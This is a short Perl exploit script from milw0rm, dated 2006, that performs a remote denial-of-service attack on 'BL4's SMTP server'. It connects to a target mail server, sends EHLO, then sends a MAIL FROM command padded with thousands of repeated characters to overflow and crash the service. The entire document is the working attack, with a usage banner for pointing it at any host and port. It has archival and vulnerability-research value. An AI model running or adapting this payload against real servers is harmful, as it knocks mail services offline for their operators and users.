#!/usr/bin/perl

use IO::Socket;
use Socket;

my($socket) = "";


if($#ARGV < 1 | $#ARGV > 2) {usage()}

if($#ARGV > 2) { $prt = $ARGV[1] } else { $prt = "25" };
$adr = $ARGV[0];
$prt = $ARGV[1];

$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$adr,
PeerPort=>$prt, Reuse=>1) or die "Error: cant connect to $adr:$prt\n";


        print " -- Connecting To SMTP server at $adr port $prt ... \n";

        sleep(1);

        print $socket "EHLO yahoo.com\r\n" and print " -- Sending Request to $adr .....\n" or die "Error : can't send Request\n";

        sleep(1);

        print $socket "MAIL FROM:" . "jessy" x 4600 . "\r\n" and print " -- Sending Buffer to $adr .....\n";

        sleep(1);
        printf("[+]Ok!\n");
        printf("[+]Crash service.....\n");
        printf("[~]Done.\n");

        close($socket);


sub usage()
 {
 print "\n=========================================\r\n";
 print "     BL4's SMTP server Remote DOS \r\n";
 print "=========================================\r\n";
 print "       Bug Found by Dedi Dwianto \r\n";
 print "    www.echo.or.id #e-c-h-o irc.dal.net \r\n";
 print "      Echo Security Research Group \r\n";
 print "=========================================\r\n";
 print " Usage: perl bl4-explo.pl [target] [port] \r\n\n";
 exit();
 }

# milw0rm.com [2006-04-27]